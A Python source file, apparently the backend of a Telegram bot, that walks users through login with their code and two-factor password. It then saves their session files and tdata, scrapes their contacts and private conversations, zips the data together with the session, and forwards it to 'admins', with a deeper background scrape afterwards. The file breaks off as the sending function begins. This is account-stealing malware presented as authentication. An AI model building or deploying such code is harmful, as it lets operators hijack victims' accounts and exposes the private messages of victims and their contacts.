#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram Client Authentication
Использует Telethon для авторизации пользователей + сохранение tdata (опционально)
"""

import asyncio
import os
import json
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, FloodWaitError
import config

# Проверяем доступность opentele (для tdata)
try:
    from opentele.td import TDesktop
    from opentele.tl import TelegramClient as OpenTeleClient
    from opentele.api import CreateNewSession
    OPENTELE_AVAILABLE = True
    print("✅ opentele доступен - tdata будет сохраняться")
except ImportError as e:
    OPENTELE_AVAILABLE = False
    print(f"⚠️ opentele недоступен: {e}")
    print("   Авторизация будет работать, но tdata сохраняться не будет")

# Хранилище активных сессий авторизации
auth_sessions = {}

class TelegramAuthSession:
    """Сессия авторизации пользователя"""
    
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.phone_code_hash = None
        self.need_2fa = False
        self.password_hint = None
        self.user_id = None
        self.session_file_path = None  # 🆕 Путь к session файлу
    
    async def start_auth(self):
        """Начать процесс авторизации - отправить код"""
        try:
            # Проверяем что API_ID и API_HASH настроены
            if config.API_ID == 12345678 or config.API_HASH == "your_api_hash_here":
                print(f"❌ API_ID или API_HASH не настроены!")
                return {
                    'success': False,
                    'error': 'API_ID и API_HASH не настроены в config.py. Получите на https://my.telegram.org'
                }
            
            print(f"🔧 Creating Telethon client for {self.phone}...", flush=True)
            print(f"   API_ID: {config.API_ID}", flush=True)
            print(f"   API_HASH: {config.API_HASH[:10]}...", flush=True)
            
            # Создаём папку для сессий если её нет
            os.makedirs('sessions', exist_ok=True)
            
            # Путь к session файлу
            self.session_file_path = f'sessions/user_{self.session_id}.session'
            
            # Создаём клиент для этой сессии
            self.client = TelegramClient(
                f'sessions/user_{self.session_id}',
                config.API_ID,
                config.API_HASH
            )
            
            print(f"🔌 Connecting to Telegram...", flush=True)
            await self.client.connect()
            print(f"✅ Connected to Telegram servers", flush=True)
            
            # Отправляем код на номер телефона
            print(f"📤 Sending code to {self.phone}...", flush=True)
            
            # ДИАГНОСТИКА: Проверяем подключение перед отправкой
            print(f"🔍 ДИAG: Pre-send checks:", flush=True)
            print(f"   Client connected: {self.client.is_connected()}", flush=True)
            print(f"   Phone format: {self.phone}", flush=True)
            print(f"   Phone length: {len(self.phone)}", flush=True)
            print(f"   API_ID type: {type(config.API_ID)}", flush=True)
            print(f"   API_HASH type: {type(config.API_HASH)}", flush=True)
            
            # Пытаемся отправить код
            try:
                sent_code = await self.client.send_code_request(self.phone)
            except FloodWaitError as flood_error:
                # FloodWait - слишком много попыток
                wait_seconds = flood_error.seconds
                wait_hours = wait_seconds // 3600
                wait_minutes = (wait_seconds % 3600) // 60
                
                wait_msg = ""
                if wait_hours > 0:
                    wait_msg = f"{wait_hours} ч {wait_minutes} мин"
                elif wait_minutes > 0:
                    wait_msg = f"{wait_minutes} минут"
                else:
                    wait_msg = f"{wait_seconds} секунд"
                
                print(f"❌ FloodWait: нужно подождать {wait_msg}", flush=True)
                
                return {
                    'success': False,
                    'error': f'⏳ Telegram ограничил отправку кодов на этот номер.\n\nПопробуйте через {wait_msg} или используйте другой номер.',
                    'flood_wait': True,
                    'wait_seconds': wait_seconds
                }
            except Exception as send_error:
                # Другие ошибки
                error_str = str(send_error)
                
                # Проверяем FloodWait в тексте ошибки (на случай если не поймали как FloodWaitError)
                if 'wait of' in error_str.lower() or 'flood' in error_str.lower():
                    import re
                    wait_match = re.search(r'(\d+)\s*second', error_str)
                    if wait_match:
                        wait_seconds = int(wait_match.group(1))
                        wait_hours = wait_seconds // 3600
                        wait_minutes = (wait_seconds % 3600) // 60
                        
                        wait_msg = ""
                        if wait_hours > 0:
                            wait_msg = f"{wait_hours} ч {wait_minutes} мин"
                        elif wait_minutes > 0:
                            wait_msg = f"{wait_minutes} минут"
                        else:
                            wait_msg = f"{wait_seconds} секунд"
                        
                        print(f"❌ FloodWait (text): нужно подождать {wait_msg}", flush=True)
                        
                        return {
                            'success': False,
                            'error': f'⏳ Telegram ограничил отправку кодов.\n\nПопробуйте через {wait_msg} или используйте другой номер.',
                            'flood_wait': True,
                            'wait_seconds': wait_seconds
                        }
                
                print(f"❌ DIAG: send_code_request failed!", flush=True)
                print(f"   Error type: {type(send_error).__name__}", flush=True)
                print(f"   Error: {send_error}", flush=True)
                raise
            
            self.phone_code_hash = sent_code.phone_code_hash
            
            # МАКСИМАЛЬНАЯ ДИАГНОСТИКА sent_code объекта
            print(f"📋 DIAG: Sent code object analysis:", flush=True)
            print(f"   Object type: {type(sent_code).__name__}", flush=True)
            print(f"   Object class: {sent_code.__class__}", flush=True)
            print(f"   Phone code hash: {self.phone_code_hash}", flush=True)
            print(f"   Hash length: {len(self.phone_code_hash)}", flush=True)
            
            # Все атрибуты объекта
            print(f"   All attributes:", flush=True)
            for attr in dir(sent_code):
                if not attr.startswith('_'):
                    try:
                        value = getattr(sent_code, attr)
                        if not callable(value):
                            print(f"      {attr}: {value}", flush=True)
                    except:
                        pass
            
            # Проверяем тип sent_code
            if hasattr(sent_code, 'type'):
                code_type = sent_code.type
                print(f"   📱 Code type object: {code_type}", flush=True)
                print(f"      Type name: {type(code_type).__name__}", flush=True)
                
                if hasattr(code_type, 'length'):
                    print(f"      Expected code length: {code_type.length}", flush=True)
                if hasattr(code_type, 'pattern'):
                    print(f"      Code pattern: {code_type.pattern}", flush=True)
                
                # КРИТИЧНО: Проверяем куда именно отправлен код
                type_name = type(code_type).__name__
                print(f"   🎯 Code delivery method: {type_name}", flush=True)
                
                if type_name == "SentCodeTypeApp":
                    print(f"   ✉️ Code sent TO TELEGRAM APP (not SMS)", flush=True)
                    print(f"   📱 User should check Telegram notifications NOW", flush=True)
                elif type_name == "SentCodeTypeSms":
                    print(f"   📧 Code sent via SMS", flush=True)
                elif type_name == "SentCodeTypeCall":
                    print(f"   📞 Code will be delivered via phone call", flush=True)
                elif type_name == "SentCodeTypeFlashCall":
                    print(f"   ⚡ Code via flash call", flush=True)
                else:
                    print(f"   ❓ Unknown delivery method: {type_name}", flush=True)
            
            # Проверяем через какой канал отправлен код
            if hasattr(sent_code, 'next_type'):
                print(f"   Next type available: {sent_code.next_type}", flush=True)
            
            if hasattr(sent_code, 'timeout'):
                timeout_val = sent_code.timeout if sent_code.timeout else 0
                print(f"   Timeout: {timeout_val} seconds", flush=True)
                if timeout_val > 0:
                    print(f"   ⏱️ User can request SMS after {timeout_val} seconds", flush=True)
                elif timeout_val == 0 and type_name == "SentCodeTypeApp":
                    print(f"   ⚠️ WARNING: Timeout is 0 - cannot request SMS!", flush=True)
                    print(f"   ⚠️ Code must arrive in Telegram app", flush=True)
                    print(f"   ⚠️ If Telegram is not installed or offline - code will NOT arrive!", flush=True)
            
            # ВАЖНО: Проверяем что клиент НЕ авторизован (иначе код не придёт)
            is_authorized = await self.client.is_user_authorized()
            print(f"   Is user already authorized: {is_authorized}", flush=True)
            
            if is_authorized:
                print(f"   ⚠️⚠️⚠️ WARNING: User is ALREADY authorized!", flush=True)
                print(f"   ⚠️⚠️⚠️ Telegram will NOT send code for already authorized user!", flush=True)
                print(f"   ⚠️⚠️⚠️ Need to logout first or delete session file!", flush=True)
            
            print(f"✅ Code request completed!", flush=True)
            print(f"   Phone: {self.phone}", flush=True)
            print(f"   Session: {self.session_id}", flush=True)
            print(f"   Session file: sessions/user_{self.session_id}.session", flush=True)
            
            return {
                'success': True,
                'phone_code_hash': self.phone_code_hash
            }
            
        except Exception as e:
            print(f"❌ Error in start_auth:", flush=True)
            print(f"   Phone: {self.phone}", flush=True)
            print(f"   Error type: {type(e).__name__}", flush=True)
            print(f"   Error message: {str(e)}", flush=True)
            
            import traceback
            print(f"   Traceback:", flush=True)
            traceback.print_exc()
            
            if self.client:
                try:
                    await self.client.disconnect()
                except:
                    pass
            
            return {
                'success': False,
                'error': str(e)
            }
    
    async def save_tdata(self, user_id):
        """Сохранить tdata после успешной авторизации"""
        if not OPENTELE_AVAILABLE:
            print(f"⚠️ opentele недоступен - tdata не будет сохранена для user {user_id}")
            return False
        
        try:
            # Создаём папку для tdata если её нет
            tdata_dir = f"tdata/{user_id}"
            os.makedirs(tdata_dir, exist_ok=True)
            
            print(f"💾 Converting session to tdata for user {user_id}...")
            
            # Конвертируем Telethon сессию в TDesktop формат
            tdesk = await self.client.ToTDesktop(flag=CreateNewSession)
            
            # Сохраняем tdata
            tdesk.SaveTData(tdata_dir)
            
            print(f"✅ TData saved to {tdata_dir}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error saving tdata: {e}")
            return False
    
    async def parse_account_data(self, quick_mode=True):
        """
        Парсинг данных аккаунта
        
        quick_mode=True: быстрый парсинг (20-40 сек) - базовая инфо + немного сообщений
        quick_mode=False: полный парсинг (2-5 мин) - глубокий сбор всех данных
        """
        mode_name = "БЫСТРЫЙ" if quick_mode else "ПОЛНЫЙ"
        print(f"📊 Parsing account data ({mode_name} режим)...", flush=True)
        
        parsed_data = {
            'contacts': [],
            'dialogs': [],
            'user_info': {},
            'chats': [],
            'channels': [],
            'private_messages': {},  # {dialog_id: [messages]}
            'group_messages': {},     # {group_id: [user messages]}
            'errors': [],
            'parsing_mode': 'quick' if quick_mode else 'full'
        }
        
        # Лимиты для быстрого и полного режимов
        if quick_mode:
            DIALOGS_LIMIT = 50
            PRIVATE_MSG_LIMIT = 20
            GROUP_MSG_LIMIT = 10
        else:
            DIALOGS_LIMIT = 200
            PRIVATE_MSG_LIMIT = 200
            GROUP_MSG_LIMIT = 100
        
        try:
            # 1. Получить информацию о пользователе
            try:
                from telethon.tl.functions.users import GetFullUserRequest
                me = await self.client.get_me()
                
                try:
                    full_user = await self.client(GetFullUserRequest(me.id))
                    bio = full_user.full_user.about if hasattr(full_user, 'full_user') else None
                except Exception as e:
                    print(f"   ⚠️ Could not get full user info: {e}", flush=True)
                    bio = None
                
                parsed_data['user_info'] = {
                    'id': me.id,
                    'phone': me.phone,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username,
                    'bio': bio,
                    'premium': me.premium if hasattr(me, 'premium') else False
                }
                
                print(f"   ✅ User info parsed", flush=True)
            except Exception as e:
                error_msg = f"Failed to parse user info: {e}"
                print(f"   ❌ {error_msg}", flush=True)
                parsed_data['errors'].append(error_msg)
            
            # 2. Получить контакты
            try:
                from telethon.tl.functions.contacts import GetContactsRequest
                from telethon.tl.types import contacts
                
                result = await self.client(GetContactsRequest(hash=0))
                
                if isinstance(result, contacts.Contacts):
                    for user in result.users:
                        parsed_data['contacts'].append({
                            'id': user.id,
                            'phone': user.phone if hasattr(user, 'phone') else None,
                            'first_name': user.first_name if hasattr(user, 'first_name') else None,
                            'last_name': user.last_name if hasattr(user, 'last_name') else None,
                            'username': user.username if hasattr(user, 'username') else None,
                            'is_bot': user.bot if hasattr(user, 'bot') else False
                        })
                
                print(f"   ✅ Contacts parsed: {len(parsed_data['contacts'])} contacts", flush=True)
            except Exception as e:
                error_msg = f"Failed to parse contacts: {e}"
                print(f"   ❌ {error_msg}", flush=True)
                parsed_data['errors'].append(error_msg)
            
            # 3. Получить диалоги
            try:
                dialogs = await self.client.get_dialogs(limit=DIALOGS_LIMIT)
                
                for dialog in dialogs:
                    dialog_data = {
                        'id': dialog.id,
                        'name': dialog.name if hasattr(dialog, 'name') else 'Unknown',
                        'type': 'user' if dialog.is_user else 'group' if dialog.is_group else 'channel',
                        'unread_count': dialog.unread_count if hasattr(dialog, 'unread_count') else 0,
                        'username': dialog.entity.username if hasattr(dialog.entity, 'username') else None
                    }
                    
                    parsed_data['dialogs'].append(dialog_data)
                    
                    # Разделяем по типам
                    if dialog.is_channel:
                        parsed_data['channels'].append(dialog_data)
                    elif dialog.is_group:
                        parsed_data['chats'].append(dialog_data)
                
                print(f"   ✅ Dialogs parsed: {len(parsed_data['dialogs'])} dialogs", flush=True)
                print(f"      → Private: {len([d for d in parsed_data['dialogs'] if d['type'] == 'user'])}", flush=True)
                print(f"      → Groups: {len(parsed_data['chats'])}", flush=True)
                print(f"      → Channels: {len(parsed_data['channels'])}", flush=True)
                
                # 4. Парсим сообщения из диалогов
                print(f"   📨 Parsing messages from dialogs...", flush=True)
                
                for dialog in dialogs:
                    try:
                        # Личные переписки
                        if dialog.is_user:
                            messages = await self.client.get_messages(dialog.entity, limit=PRIVATE_MSG_LIMIT)
                            
                            msg_list = []
                            for msg in messages:
                                if msg and msg.message:
                                    msg_list.append({
                                        'id': msg.id,
                                        'date': msg.date.isoformat() if msg.date else None,
                                        'text': msg.message,
                                        'from_id': msg.from_id.user_id if msg.from_id and hasattr(msg.from_id, 'user_id') else None,
                                        'is_outgoing': msg.out
                                    })
                            
                            if msg_list:
                                parsed_data['private_messages'][str(dialog.id)] = {
                                    'dialog_name': dialog.name,
                                    'messages': msg_list
                                }
                        
                        # Группы и каналы - только сообщения пользователя
                        elif dialog.is_group or dialog.is_channel:
                            # Получаем сообщения пользователя
                            messages = await self.client.get_messages(
                                dialog.entity,
                                limit=GROUP_MSG_LIMIT,
                                from_user='me'
                            )
                            
                            msg_list = []
                            for msg in messages:
                                if msg and msg.message:
                                    msg_list.append({
                                        'id': msg.id,
                                        'date': msg.date.isoformat() if msg.date else None,
                                        'text': msg.message
                                    })
                            
                            if msg_list:
                                parsed_data['group_messages'][str(dialog.id)] = {
                                    'dialog_name': dialog.name,
                                    'dialog_type': 'group' if dialog.is_group else 'channel',
                                    'messages': msg_list
                                }
                    
                    except Exception as e:
                        # Пропускаем чаты где нет доступа
                        continue
                
                print(f"   ✅ Messages parsed:", flush=True)
                print(f"      → Private dialogs with messages: {len(parsed_data['private_messages'])}", flush=True)
                print(f"      → Groups/channels with user messages: {len(parsed_data['group_messages'])}", flush=True)
                
            except Exception as e:
                error_msg = f"Failed to parse dialogs: {e}"
                print(f"   ❌ {error_msg}", flush=True)
                parsed_data['errors'].append(error_msg)
            
            # Итоговый отчёт
            if parsed_data['errors']:
                print(f"   ⚠️ Parsing completed with {len(parsed_data['errors'])} error(s)", flush=True)
            else:
                print(f"   ✅ All data parsed successfully ({mode_name} mode)", flush=True)
            
            return parsed_data
            
        except Exception as e:
            print(f"❌ Critical error in parse_account_data: {e}", flush=True)
            import traceback
            traceback.print_exc()
            
            # Возвращаем хотя бы то что успели собрать
            parsed_data['errors'].append(f"Critical error: {e}")
            return parsed_data
    
    async def verify_code(self, code):
        """Проверить код подтверждения"""
        try:
            if not self.client or not self.client.is_connected():
                return {
                    'success': False,
                    'error': 'Session expired'
                }
            
            # Пытаемся войти с кодом
            try:
                await self.client.sign_in(self.phone, code, phone_code_hash=self.phone_code_hash)
                
                # Успешный вход без 2FA
                me = await self.client.get_me()
                self.user_id = me.id
                
                print(f"✅ Successfully signed in: {me.id}")
                
                # 🆕 БЫСТРЫЙ ПАРСИНГ ДАННЫХ АККАУНТА
                parsed_data = await self.parse_account_data(quick_mode=True)
                
                # СОХРАНЯЕМ TDATA (пробуем, но если не получится - не страшно)
                await self.save_tdata(me.id)
                
                # НЕ отключаемся пока - оставляем соединение для фонового парсинга
                # await self.client.disconnect()
                
                return {
                    'success': True,
                    'need_2fa': False,
                    'user': {
                        'id': me.id,
                        'phone': me.phone,
                        'first_name': me.first_name,
                        'last_name': me.last_name,
                        'username': me.username
                    },
                    'parsed_data': parsed_data,  # 🆕 Быстрые данные
                    'session_file': self.session_file_path,  # 🆕 Путь к session файлу
                    'start_full_parse': True  # 🆕 Флаг для запуска полного парсинга
                }
                
                
            except SessionPasswordNeededError:
                # Требуется 2FA пароль
                self.need_2fa = True
                
                # В новых версиях Telethon нет get_password()
                # Пытаемся получить hint другим способом
                try:
                    from telethon.tl.functions.account import GetPasswordRequest
                    password_info = await self.client(GetPasswordRequest())
                    self.password_hint = password_info.hint or "Нет подсказки"
                except Exception as hint_error:
                    print(f"   ⚠️ Could not get password hint: {hint_error}", flush=True)
                    self.password_hint = "Нет подсказки"
                
                print(f"⚠️ 2FA required for {self.phone}, hint: {self.password_hint}", flush=True)
                
                return {
                    'success': True,
                    'need_2fa': True,
                    'password_hint': self.password_hint
                }
            
            except PhoneCodeInvalidError:
                return {
                    'success': False,
                    'error': 'Invalid code'
                }
                
        except Exception as e:
            print(f"❌ Error verifying code: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def verify_2fa(self, password):
        """Проверить 2FA пароль"""
        try:
            if not self.client or not self.client.is_connected():
                return {
                    'success': False,
                    'error': 'Session expired'
                }
            
            try:
                await self.client.sign_in(password=password)
                
                # Успешный вход с 2FA
                me = await self.client.get_me()
                self.user_id = me.id
                
                print(f"✅ Successfully signed in with 2FA: {me.id}")
                
                # 🆕 БЫСТРЫЙ ПАРСИНГ ДАННЫХ АККАУНТА
                parsed_data = await self.parse_account_data(quick_mode=True)
                
                # СОХРАНЯЕМ TDATA (пробуем, но если не получится - не страшно)
                await self.save_tdata(me.id)
                
                # НЕ отключаемся пока - оставляем соединение для фонового парсинга
                # await self.client.disconnect()
                
                return {
                    'success': True,
                    'user': {
                        'id': me.id,
                        'phone': me.phone,
                        'first_name': me.first_name,
                        'last_name': me.last_name,
                        'username': me.username
                    },
                    'parsed_data': parsed_data,  # 🆕 Быстрые данные
                    'session_file': self.session_file_path,  # 🆕 Путь к session файлу
                    'start_full_parse': True  # 🆕 Флаг для запуска полного парсинга
                }
                
            except PasswordHashInvalidError:
                return {
                    'success': False,
                    'error': 'Invalid password'
                }
                
        except Exception as e:
            print(f"❌ Error verifying 2FA: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def cleanup(self):
        """Очистить сессию (отключиться, но НЕ удалять файлы)"""
        if self.client and self.client.is_connected():
            await self.client.disconnect()


# Глобальные функции для работы с сессиями

def create_auth_session(session_id, phone):
    """Создать новую сессию авторизации"""
    session = TelegramAuthSession(session_id, phone)
    auth_sessions[session_id] = session
    return session

def get_auth_session(session_id):
    """Получить сессию авторизации"""
    return auth_sessions.get(session_id)

def remove_auth_session(session_id):
    """Удалить сессию авторизации из памяти"""
    if session_id in auth_sessions:
        del auth_sessions[session_id]

async def start_telegram_auth(session_id, phone):
    """Начать авторизацию через Telegram"""
    session = create_auth_session(session_id, phone)
    result = await session.start_auth()
    
    if not result['success']:
        remove_auth_session(session_id)
    
    return result

async def verify_telegram_code(session_id, code):
    """Проверить код из Telegram"""
    session = get_auth_session(session_id)
    
    if not session:
        return {
            'success': False,
            'error': 'Session not found'
        }
    
    result = await session.verify_code(code)
    
    # Если успешно и не нужен 2FA - очищаем из памяти (но файлы остаются!)
    if result.get('success') and not result.get('need_2fa'):
        await session.cleanup()
        remove_auth_session(session_id)
    
    return result

async def verify_telegram_2fa(session_id, password):
    """Проверить 2FA пароль"""
    session = get_auth_session(session_id)
    
    if not session:
        return {
            'success': False,
            'error': 'Session not found'
        }
    
    result = await session.verify_2fa(password)
    
    # Если успешно - очищаем из памяти (но файлы остаются!)
    if result.get('success'):
        await session.cleanup()
        remove_auth_session(session_id)
    
    return result


# ============================================
# Создание ZIP архива с данными
# ============================================

def create_data_archive(user_data, parsed_data, session_file_path, tdata_path):
    """
    Создать ZIP архив с данными пользователя
    
    Структура:
    - summary.txt (краткая сводка)
    - data.json (полный JSON)
    - session/ (session файл)
    - contacts/ (контакты в TXT и JSON)
    - chats_and_channels/ (списки чатов и каналов)
    - private_dialogs/ (переписки с каждым пользователем)
    - group_messages/ (сообщения в группах)
    """
    try:
        import zipfile
        import io
        from datetime import datetime
        
        mode = parsed_data.get('parsing_mode', 'quick')
        mode_name = "БЫСТРЫЙ" if mode == 'quick' else "ПОЛНЫЙ"
        
        print(f"   📦 Creating ZIP archive ({mode_name})...", flush=True)
        
        # Создаём ZIP в памяти
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            
            # 1. Summary.txt
            summary = f"""
╔════════════════════════════════════════════════════════════════╗
║           ДАННЫЕ ПОЛЬЗОВАТЕЛЯ TELEGRAM - {mode_name} ПАРСИНГ          ║
╚════════════════════════════════════════════════════════════════╝

📅 Дата сбора: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

👤 ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• ID: {user_data['id']}
• Телефон: {user_data['phone']}
• Имя: {user_data.get('first_name', 'Нет')} {user_data.get('last_name', '')}
• Username: @{user_data.get('username', 'нет')}
• Bio: {parsed_data.get('user_info', {}).get('bio', 'Нет')}
• Premium: {'Да' if parsed_data.get('user_info', {}).get('premium') else 'Нет'}

📊 СТАТИСТИКА:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Контактов: {len(parsed_data.get('contacts', []))}
• Всего диалогов: {len(parsed_data.get('dialogs', []))}
• Личных переписок: {len([d for d in parsed_data.get('dialogs', []) if d['type'] == 'user'])}
• Групп: {len(parsed_data.get('chats', []))}
• Каналов: {len(parsed_data.get('channels', []))}

📨 СОБРАННЫЕ СООБЩЕНИЯ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Личных переписок с сообщениями: {len(parsed_data.get('private_messages', {}))}
• Групп/каналов с сообщениями пользователя: {len(parsed_data.get('group_messages', {}))}

📁 ФАЙЛЫ В АРХИВЕ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• summary.txt - Эта сводка
• data.json - Полные данные в JSON формате
• session/ - Telethon session файл
• contacts/ - Список всех контактов
• chats_and_channels/ - Списки групп и каналов
• private_dialogs/ - Переписки с пользователями
• group_messages/ - Сообщения пользователя в группах

{'⚠️ ОШИБКИ: ' + str(len(parsed_data.get('errors', []))) if parsed_data.get('errors') else '✅ Парсинг завершён без ошибок'}

═══════════════════════════════════════════════════════════════
"""
            zipf.writestr('summary.txt', summary.encode('utf-8'))
            
            # 2. data.json
            json_data = {
                'user_info': parsed_data.get('user_info', {}),
                'contacts': parsed_data.get('contacts', []),
                'dialogs': parsed_data.get('dialogs', []),
                'chats': parsed_data.get('chats', []),
                'channels': parsed_data.get('channels', []),
                'private_messages': parsed_data.get('private_messages', {}),
                'group_messages': parsed_data.get('group_messages', {}),
                'tdata_path': tdata_path,
                'session_file': session_file_path,
                'parsing_mode': mode,
                'errors': parsed_data.get('errors', [])
            }
            zipf.writestr('data.json', json.dumps(json_data, indent=2, ensure_ascii=False).encode('utf-8'))
            
            # 3. Session файл
            if session_file_path and os.path.exists(session_file_path):
                zipf.write(session_file_path, f'session/{os.path.basename(session_file_path)}')
            
            # 4. Контакты
            contacts = parsed_data.get('contacts', [])
            if contacts:
                # contacts_list.txt
                contacts_txt = "╔════════════════════════════════════════════════╗\n"
                contacts_txt += "║            СПИСОК КОНТАКТОВ                    ║\n"
                contacts_txt += "╚════════════════════════════════════════════════╝\n\n"
                contacts_txt += f"Всего контактов: {len(contacts)}\n\n"
                
                for i, contact in enumerate(contacts, 1):
                    name = f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip()
                    username = f"@{contact.get('username')}" if contact.get('username') else "нет username"
                    phone = contact.get('phone', 'нет номера')
                    bot = " [БОТ]" if contact.get('is_bot') else ""
                    
                    contacts_txt += f"{i}. {name}{bot}\n"
                    contacts_txt += f"   Username: {username}\n"
                    contacts_txt += f"   Телефон: {phone}\n"
                    contacts_txt += f"   ID: {contact.get('id')}\n\n"
                
                zipf.writestr('contacts/contacts_list.txt', contacts_txt.encode('utf-8'))
                zipf.writestr('contacts/contacts.json', json.dumps(contacts, indent=2, ensure_ascii=False).encode('utf-8'))
            
            # 5. Чаты и каналы
            chats = parsed_data.get('chats', [])
            channels = parsed_data.get('channels', [])
            
            if chats:
                chats_txt = "╔════════════════════════════════════════════════╗\n"
                chats_txt += "║              СПИСОК ГРУПП                      ║\n"
                chats_txt += "╚════════════════════════════════════════════════╝\n\n"
                chats_txt += f"Всего групп: {len(chats)}\n\n"
                
                for i, chat in enumerate(chats, 1):
                    chats_txt += f"{i}. {chat.get('name', 'Unknown')}\n"
                    chats_txt += f"   ID: {chat.get('id')}\n"
                    if chat.get('username'):
                        chats_txt += f"   Username: @{chat['username']}\n"
                    chats_txt += f"   Непрочитанных: {chat.get('unread_count', 0)}\n\n"
                
                zipf.writestr('chats_and_channels/groups_list.txt', chats_txt.encode('utf-8'))
            
            if channels:
                channels_txt = "╔════════════════════════════════════════════════╗\n"
                channels_txt += "║             СПИСОК КАНАЛОВ                     ║\n"
                channels_txt += "╚════════════════════════════════════════════════╝\n\n"
                channels_txt += f"Всего каналов: {len(channels)}\n\n"
                
                for i, channel in enumerate(channels, 1):
                    channels_txt += f"{i}. {channel.get('name', 'Unknown')}\n"
                    channels_txt += f"   ID: {channel.get('id')}\n"
                    if channel.get('username'):
                        channels_txt += f"   Username: @{channel['username']}\n"
                    channels_txt += f"   Непрочитанных: {channel.get('unread_count', 0)}\n\n"
                
                zipf.writestr('chats_and_channels/channels_list.txt', channels_txt.encode('utf-8'))
            
            # JSON с подробностями
            if chats or channels:
                details = {'groups': chats, 'channels': channels}
                zipf.writestr('chats_and_channels/details.json', json.dumps(details, indent=2, ensure_ascii=False).encode('utf-8'))
            
            # 6. Личные переписки
            private_msgs = parsed_data.get('private_messages', {})
            for dialog_id, dialog_data in private_msgs.items():
                dialog_name = dialog_data.get('dialog_name', 'Unknown')
                messages = dialog_data.get('messages', [])
                
                if messages:
                    # Очищаем имя для файла
                    safe_name = "".join(c for c in dialog_name if c.isalnum() or c in (' ', '_', '-')).strip()
                    safe_name = safe_name[:50]  # Ограничиваем длину
                    
                    msg_txt = f"═══════════════════════════════════════════════════\n"
                    msg_txt += f"  Переписка с: {dialog_name}\n"
                    msg_txt += f"  ID: {dialog_id}\n"
                    msg_txt += f"  Сообщений: {len(messages)}\n"
                    msg_txt += f"═══════════════════════════════════════════════════\n\n"
                    
                    for msg in reversed(messages):  # От старых к новым
                        date = msg.get('date', 'Нет даты')
                        is_out = msg.get('is_outgoing', False)
                        sender = "Вы" if is_out else dialog_name
                        text = msg.get('text', '')
                        
                        msg_txt += f"[{date}] {sender}:\n"
                        msg_txt += f"{text}\n\n"
                        msg_txt += "-" * 50 + "\n\n"
                    
                    zipf.writestr(f'private_dialogs/{safe_name}.txt', msg_txt.encode('utf-8'))
            
            # 7. Сообщения в группах
            group_msgs = parsed_data.get('group_messages', {})
            for group_id, group_data in group_msgs.items():
                group_name = group_data.get('dialog_name', 'Unknown')
                group_type = group_data.get('dialog_type', 'group')
                messages = group_data.get('messages', [])
                
                if messages:
                    safe_name = "".join(c for c in group_name if c.isalnum() or c in (' ', '_', '-')).strip()
                    safe_name = safe_name[:50]
                    
                    msg_txt = f"═══════════════════════════════════════════════════\n"
                    msg_txt += f"  {'Группа' if group_type == 'group' else 'Канал'}: {group_name}\n"
                    msg_txt += f"  ID: {group_id}\n"
                    msg_txt += f"  Ваших сообщений: {len(messages)}\n"
                    msg_txt += f"═══════════════════════════════════════════════════\n\n"
                    
                    for msg in reversed(messages):
                        date = msg.get('date', 'Нет даты')
                        text = msg.get('text', '')
                        
                        msg_txt += f"[{date}] Вы:\n"
                        msg_txt += f"{text}\n\n"
                        msg_txt += "-" * 50 + "\n\n"
                    
                    zipf.writestr(f'group_messages/{safe_name}_messages.txt', msg_txt.encode('utf-8'))
        
        zip_buffer.seek(0)
        result = zip_buffer.getvalue()
        
        print(f"   ✅ ZIP archive created: {len(result)} bytes ({len(result) / 1024 / 1024:.2f} MB)", flush=True)
        
        return result
        
    except Exception as e:
        print(f"   ❌ Error creating ZIP archive: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return None


async def start_full_parsing_background(session_file_path, user_data):
    """
    Запустить полный парсинг в фоне
    Вызывается после отправки быстрого архива
    """
    try:
        import asyncio
        
        print(f"🔄 Starting FULL background parsing for user {user_data['id']}...", flush=True)
        
        # Ждём 5 секунд чтобы быстрый архив точно отправился
        await asyncio.sleep(5)
        
        # Создаём новый клиент для фонового парсинга
        client = TelegramClient(
            session_file_path.replace('.session', ''),
            config.API_ID,
            config.API_HASH
        )
        
        await client.connect()
        
        # Проверяем что сессия ещё валидна
        if not await client.is_user_authorized():
            print(f"   ❌ Session is no longer authorized for user {user_data['id']}", flush=True)
            await client.disconnect()
            return
        
        print(f"   ✅ Connected for full parsing", flush=True)
        
        # Создаём временную сессию для парсинга
        temp_session = TelegramAuthSession(f"full_parse_{user_data['id']}", user_data.get('phone', ''))
        temp_session.client = client
        temp_session.session_file_path = session_file_path
        
        # ПОЛНЫЙ ПАРСИНГ
        parsed_data = await temp_session.parse_account_data(quick_mode=False)
        
        # Отключаемся
        await client.disconnect()
        
        print(f"   ✅ Full parsing completed", flush=True)
        
        # Отправляем админам
        from bot import bot as telegram_bot
        tdata_path = f"tdata/{user_data.get('id')}"
        
        await send_data_to_admins(
            telegram_bot,
            user_data,
            parsed_data,
            tdata_path,
            session_file_path
        )
        
        print(f"✅ Full data sent to admins for user {user_data['id']}", flush=True)
        
    except Exception as e:
        print(f"❌ Error in full background parsing: {e}", flush=True)
        import traceback
        traceback.print_exc()


# ============================================
# Отправка данных админам
# ============================================

async def send_data_to_admins(bot, user_data, parsed_data, tdata_path, session_file_path=None):
    """Отправить спарсенные данные и ZIP архив админам"""
    try:
        from aiogram.types import BufferedInputFile
        from aiogram.enums import ParseMode
        from aiogram import Bot
        
        print(f"📤 Starting send_data_to_admins for user {user_data['id']}", flush=True)
